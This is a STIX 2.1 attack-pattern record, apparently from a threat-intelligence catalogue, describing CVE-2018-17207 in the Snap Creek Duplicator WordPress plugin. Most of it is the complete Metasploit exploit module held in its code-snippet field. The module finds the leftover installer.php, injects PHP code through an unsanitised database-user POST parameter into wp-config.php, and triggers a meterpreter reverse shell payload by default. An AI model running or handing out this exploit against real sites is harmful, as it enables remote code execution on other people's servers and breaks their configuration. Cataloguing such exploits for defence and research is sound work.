{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f4fd0c5d-2cf7-49d7-ae9d-1f088e1bc8f1",
    "created": "2024-08-14T17:05:20.678285Z",
    "modified": "2024-08-14T17:05:20.67829Z",
    "name": "Snap Creek Duplicator WordPress plugin code injection",
    "description": " When the WordPress plugin Snap Creek Duplicator restores a backup, it leaves dangerous files in the filesystem such as installer.php and installer-backup.php. These files allow anyone to call a function that overwrite the wp-config.php file AND this function does not sanitize POST parameters before inserting them inside the wp-config.php file leading to arbitrary PHP code execution. WARNING: This exploit WILL break the wp-config.php file. If possible try to restore backups of the configuration after the exploit to make the WordPress site work again. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/php/wp_duplicator_code_inject.rb",
            "external_id": "wp_duplicator_code_inject.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.synacktiv.com/ressources/advisories/WordPress_Duplicator-1.2.40-RCE.pdf"
        },
        {
            "source_name": "WPVDB",
            "external_id": "9123"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-17207"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking # this module overwrites the configuration file, breaking the website\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Snap Creek Duplicator WordPress plugin code injection',\n        'Description' => %q{\n          When the WordPress plugin Snap Creek Duplicator restores a backup, it\n          leaves dangerous files in the filesystem such as installer.php and\n          installer-backup.php. These files allow anyone to call a function that\n          overwrite the wp-config.php file AND this function does not sanitize\n          POST parameters before inserting them inside the wp-config.php file,\n          leading to arbitrary PHP code execution.\n          WARNING: This exploit WILL break the wp-config.php file. If possible try\n          to restore backups of the configuration after the exploit to make the\n          WordPress site work again.\n        },\n        'Author' => [\n          'Julien Legras <julien.legras@synacktiv.com>',\n          'Thomas Chauchefoin <thomas.chauchefoin@synacktiv.com>'\n        ],\n        'References' => [\n          ['URL', 'https://www.synacktiv.com/ressources/advisories/WordPress_Duplicator-1.2.40-RCE.pdf'],\n          ['WPVDB', '9123'],\n          ['CVE', '2018-17207']\n        ],\n        'License' => MSF_LICENSE,\n        'Privileged' => false,\n        'DisclosureDate' => '2018-08-29',\n        'DefaultOptions' => {\n          'PAYLOAD' => 'php/meterpreter/reverse_tcp'\n        },\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [['WordPress Duplicator <= 1.2.40', {}]],\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, \"The TARGETURI where installer.php or installer-backup.php is located\", \"/installer.php\"]),\n      OptInt.new('TIMEOUT', [ true, 'Timeout for web requests', 40]),\n    ])\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    tpath = normalize_uri(datastore['TARGETURI'])\n\n    vprint_status(\"Checking URI #{rhost + tpath}\")\n    response = send_request_cgi({ 'uri' => tpath }, timeout = datastore['TIMEOUT'])\n\n    unless response\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless response.code == 200\n      vprint_error(\"Server responded with #{response.code}\")\n      return CheckCode::Safe\n    end\n\n    # check_plugin_version_from_readme('duplicator', '1.2.42')\n    version = response.body.to_s.scan(/version: ([^<]*)</).last.first\n    if Rex::Version.new(version) <= Rex::Version.new(\"1.2.40\")\n      return CheckCode::Vulnerable\n    else\n      return CheckCode::Detected\n    end\n  end\n\n  def create_wp_config_file\n    # 1. GET the installer.php to retrieve the archive name.\n    response = send_request_cgi({ 'uri' => normalize_uri(datastore['TARGETURI']) }, timeout = datastore['TIMEOUT'])\n    unless response && response.code == 200\n      fail_with(Failure::NotFound, \"Failed to retrieve the archive name, cannot create the wp-config.php file.\")\n    end\n    archive_name = response.body.to_s.scan(/value=\"([^\"]*.zip)\"/).flatten.first\n    if archive_name.blank?\n      fail_with(Failure::NotFound, \"Failed to retrieve the archive name, cannot create the wp-config.php file.\")\n    end\n\n    print_status(\"Found archive name #{archive_name}\")\n\n    # 2. Perform the 1st step to actually create the wp-config.php file.\n    response = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI']),\n      'vars_post' => {\n        'action_ajax' => \"1\",\n        'action_step' => \"1\",\n        'archive_name' => archive_name,\n        'archive_engine' => \"ziparchive\",\n        'exe_safe_mode' => \"0\",\n        'archive_filetime' => \"current\",\n        'logging' => \"1\"\n      }\n    }, timeout = datastore['TIMEOUT'])\n    unless response && response.code == 200\n      fail_with(Failure::Unknown, \"The archive file #{archive_name} was probably deleted.\")\n    end\n\n    print_status(\"Successfully created the wp-config.php file!\")\n  end\n\n  def exploit\n    print_status(\"Checking if the wp-config.php file already exists...\")\n    tpath_wp_config = normalize_uri(datastore['TARGETURI'] + '/../wp-config.php')\n    response = send_request_cgi({ 'uri' => tpath_wp_config }, timeout = datastore['TIMEOUT'])\n\n    if response && response.code == 404 # we have to perform action_step 1 to create the wp-config.php file.\n      print_status(\"This WordPress was not restored. Creating the wp-config.php file...\")\n      create_wp_config_file\n    end\n\n    # 2. Exploit the code injection.\n    print_status(\"All good! Injecting PHP code in the wp-config.php file...\")\n    response = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(datastore['TARGETURI']),\n      'vars_post' => {\n        'action_ajax' => \"3\",\n        'action_step' => \"3\",\n        'dbhost' => rand_text_alphanumeric(20),\n        'dbname' => rand_text_alphanumeric(20),\n        'dbpass' => rand_text_alphanumeric(20),\n        'dbuser' => \"');?>\" + payload.encoded + \"/*\",\n        'dbport' => rand_text_numeric(5)\n      }\n    }, timeout = datastore['TIMEOUT'])\n\n    if response && response.code == 200\n      print_status(\"Requesting wp-config.php to execute the payload...\")\n      send_request_cgi({ 'uri' => tpath_wp_config }, timeout = datastore['TIMEOUT'])\n    else\n      print_error(\"Failed to inject PHP code in wp-config.php...\")\n    end\n  end\n\n  def on_new_session(client)\n    if client.type.eql?('meterpreter')\n      client.core.use('stdapi') unless client.ext.aliases.include?('stdapi')\n      client.fs.file.rm('wp-config.php')\n    else\n      client.shell_command_token('rm wp-config.php')\n    end\n    print_status(\"Attempting to recreate wp-config file...\")\n    create_wp_config_file\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-08-29",
    "x_mitre_platforms": [
        "php'"
    ]
}